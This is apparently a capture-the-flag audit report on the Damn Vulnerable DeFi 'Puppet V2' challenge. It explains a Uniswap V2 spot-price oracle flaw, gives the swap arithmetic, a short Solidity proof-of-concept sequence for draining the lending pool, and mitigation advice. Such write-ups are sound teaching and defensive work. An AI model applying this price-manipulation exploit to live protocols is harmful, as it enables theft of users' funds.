# PuppetV2 — Audit Report

**Protocol:** Damn Vulnerable DeFi (Puppet V2 CTF)<br>
**Challenge:** PuppetV2 — Uniswap v2 price as oracle<br>
**Time Spent:** 34 minutes<br>
**Status:** Solved

---

## Executive Summary

**Vulnerability Identified:** The `PuppetV2Pool` contract computes required WETH collateral from **Uniswap V2's instantaneous spot price**, reading `getReserves()` and `quote()` directly. The Uniswap pair is shallow (100 DVT / 10 WETH), so a single large swap by the attacker immediately distorts the spot price and reduces the required collateral, allowing draining the lending pool.

**Severity:** Critical
**Attack Complexity:** Low (single atomic sequence using in-scope assets)
**Impact:** Drain of the lending pool's `1,000,000` DVT under CTF conditions
**Root Cause:** Blind trust in a single, manipulable, on-chain spot price from a shallow DEX pool — no TWAP, no aggregation, no sanity checks, and the protocol exposure far exceeds oracle pool depth.

---

## Challenge Overview

**Objective:** Borrow and drain all tokens (`1,000,000 DVT`) from the lending pool and deposit them to the `recovery` account.

**Initial State (from test constants):**

* Uniswap pair (DVT/WETH): `UNISWAP_INITIAL_TOKEN_RESERVE = 100 DVT`, `UNISWAP_INITIAL_WETH_RESERVE = 10 WETH`
* Player: `PLAYER_INITIAL_TOKEN_BALANCE = 10,000 DVT`, `PLAYER_INITIAL_ETH_BALANCE = 20 ETH`
* Lending pool: `POOL_INITIAL_TOKEN_BALANCE = 1,000,000 DVT`
* Oracle: `PuppetV2Pool._getOracleQuote()` → `UniswapV2Library.getReserves()` → `UniswapV2Library.quote()` (spot price)

**Success Criteria:**

* Borrow out the full `1,000,000 DVT` from the pool and transfer to `recovery`.
* Tests must assert `token.balanceOf(lendingPool) == 0` and `token.balanceOf(recovery) == 1,000,000 DVT`.

---

## Vulnerability Analysis

### Root Cause (refined)

The pool calculates required WETH collateral using:

```solidity
function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
    return _getOracleQuote(amount) * 3;
}

function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));

    return UniswapV2Library.quote(amount * 10 ** 18, reservesToken, reservesWETH);
}
```

* The oracle reads **live Uniswap reserves** and computes a proportional conversion (`quote`) with no time-weighting (TWAP) or cross-source aggregation.
* Because the underlying Uniswap pair is *very shallow* compared to the lending pool exposure, **a single, large swap** changes the pair reserves enough to produce a drastically different quoted price within the same block/transaction.
* The lending contract trusts that instantaneous quote to decide collateral (and in the test it expects the deposit to be ~`3×` value — the pool enforces a multiplier), enabling an attacker to reduce required collateral to a tiny fraction of the true market value and borrow the entire pool.

**Short:** The protocol trusts an instantly manipulable spot price from a single low-liquidity pool as the authoritative oracle.

---

## Attack Vector — Transaction-level Trace

Below I walk through the exact sequence executed in the test and show the on-chain arithmetic using the test constants. This proves the exploit economics.

**Constants (all values in proper wei units, displayed in human-readable ether for clarity):**

* `reserveToken_initial = 100e18` wei (100 DVT)
* `reserveWETH_initial = 10e18` wei (10 WETH)
* `k = reserveToken_initial × reserveWETH_initial = (100e18) × (10e18) = 1000e36` wei²
* `playerToken = 10,000e18` wei (10,000 DVT)
* `playerETH = 20e18` wei (20 ETH)

**Collateral rule (from code/tests):** the pool requires `3 × tokenValueInWETH` as deposit.

* This explains test assertions such as: `calculateDepositOfWETHRequired(1 token) == 0.3 WETH`, and for the full pool `300,000 WETH`.

---

### Step 0 — Baseline (before manipulation)

* Spot price (WETH per token) as the pool reports:

  ```
  p_before = reserveWETH / reserveToken 
           = 10e18 / 100e18 
           = 0.1 WETH per DVT
  ```

* Required deposit to borrow the whole `1,000,000` DVT:

  ```
  deposit_before = 3 × p_before × 1,000,000
                 = 3 × 0.1 × 1,000,000 
                 = 300,000 WETH
  ```

  (Matches test: `calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)` = `300,000 ether`.)

---

### Step 1 — Attacker swaps **10,000 DVT → WETH** on Uniswap

Uniswap swap math (v2) with 0.3% fee:

* `amountIn = 10,000e18` wei (10,000 DVT)
* `amountInWithFee = amountIn × 0.997 = 10,000e18 × 0.997 = 9,970e18` wei (9,970 DVT effective)

New token reserve after adding input:

```
reserveToken_new = reserveToken_initial + amountInWithFee
                 = 100e18 + 9,970e18 
                 = 10,070e18 wei (10,070 DVT)
```

New WETH reserve (by constant product formula):

```
reserveWETH_new = k / reserveToken_new
                = (1000e36) / (10,070e18)
                = 99.30268e15 wei
                ≈ 0.09930268 WETH
```

WETH sent to attacker (amountOut):

```
amountOut_WETH = reserveWETH_initial - reserveWETH_new
               = 10e18 - 99.30268e15
               = 9.90069732e18 wei
               ≈ 9.9007 WETH
```

**Post-swap pool reserves:**

* `reserveToken = 10,070e18` wei (10,070 DVT)
* `reserveWETH = 99.30268e15` wei (≈0.0993 WETH)

**New spot price (WETH per token) as oracle reads:**

```
p_after = reserveWETH_new / reserveToken_new
        = 99.30268e15 / 10,070e18
        = 0.09930268e18 / 10,070e18
        ≈ 9.86089 × 10^-6 WETH per DVT
```

*(Interpretation: DVT is now extremely cheap in WETH; 1 token ≈ 0.0000098609 WETH.)*

---

### Step 2 — Required deposit after manipulation

The `_getOracleQuote()` function computes:

```solidity
return UniswapV2Library.quote(amount * 10 ** 18, reservesToken, reservesWETH);
```

For borrowing `1,000,000` DVT:

```
quote_result = (1,000,000e18 × 1e18) × reserveWETH_new / reserveToken_new
             = (1e24 × 1e18) × 99.30268e15 / 10,070e18
             = 1e42 × 99.30268e15 / 10,070e18
             ≈ 9.86089e18 wei (per token basis, scaled by 1e18)
```

Then the pool applies the 3× multiplier:

```
deposit_after = quote_result × 3 / 1e18
              = (9.86089e18 × 3) / 1e18
              ≈ 29.58267 WETH
```

**Result:** After the attacker's single swap, the required deposit to borrow the entire pool has dropped from **300,000 WETH** to **≈29.58 WETH**. The attacker started with 20 ETH and received ~9.9 WETH from the swap, totaling ~29.9 WETH available — sufficient to meet the manipulated collateral requirement.

---

### Step 3 — Borrow & Recover

* The attacker converts their ETH to WETH (`weth.deposit{value: ...}()`), approves the pool, and calls:

```solidity
lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
```

* Given the manipulated oracle, `calculateDepositOfWETHRequired` returns ~29.58 WETH, so the pool accepts the deposit and transfers `1,000,000` DVT to the borrower.

* Attacker transfers borrowed DVT to the `recovery` address as required by the CTF.

**Net effect (CTF):** Lending pool emptied; recovery receives `1,000,000` DVT.

---

## Proof of Concept (POC)

```solidity
1. token.approve(router, PLAYER_INITIAL_TOKEN_BALANCE);
2. router.swapExactTokensForTokens(
       PLAYER_INITIAL_TOKEN_BALANCE, // 10,000 DVT
       1,                          
       [token, weth],                
       player,                       
       block.timestamp
   );
3. weth.deposit{value: address(player).balance}();
4. weth.approve(address(lendingPool), type(uint256).max);
5. lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);  // borrow 1,000,000 DVT
6. token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
```

The numeric math above proves that steps 2→5 are sufficient to reduce collateral requirements from hundreds of thousands WETH down to tens of WETH, enabling the borrow.

---

## Recommendations (actionable & prioritized)

1. **Use TWAP for Uniswap-derived price feeds**

   * Replace direct `getReserves()` spot reads with UniswapV2 cumulative price → compute TWAP over a relevant window (e.g., minutes).
   * This requires callers to track cumulative price snapshots and compute averages; TWAPs make single-block manipulations infeasible.

2. **Use multi-source aggregation**

   * Combine the DEX-based price with other DEXes and an oracle aggregator (e.g., Chainlink) and take a median/weighted average.

3. **Add liquidity / depth checks and sanity bounds**

   * Reject or flag oracle readings from a pool whose reserves are below a configured threshold relative to the protocol's exposure.
   * Reject price updates that move more than X% in one block (or require higher collateral for large immediate borrows).

4. **Require higher initial overcollateralization for large borrows**

   * Add guard rails so that extremely large borrow requests require additional checks or a timelock.

5. **Balance vs reserve monitor**

   * If any external code reads `token.balanceOf(pair)` instead of `getReserves()`, fix it. Also alert if `balanceOf` and `reserve` diverge unexpectedly.

---

## Lessons Learned

* Never trust an instantaneous single-source AMM spot price for critical collateralization decisions.
* Economic attack surfaces are as important as code bugs — audits must examine both code paths and protocol token economics (pool depth vs exposure).
* TWAPs + multi-source aggregation + sanity checks form a robust baseline for DEX-derived pricing.

---

## Metadata

**Tools Used:** Manual audit, the Foundry test harness provided in the repo.
**Pattern Reference:** `#07-oracle-manipulation-uniswapv2`
**Time Breakdown:**

* 10:36–10:50 — Source review, identify oracle dependency
* 10:50–11:05 — Model swap math & compute numeric impact (above)
* 11:05–11:10 — Finalize report & recommendations

**Total Time:** 34 minutes

---
*Report generated on [04-11-2025] by [0xUnavailable]*  
*GitHub: [https://github.com/0xUnavailable]*  
*Twitter: [https://x.com/0xUnavailable]*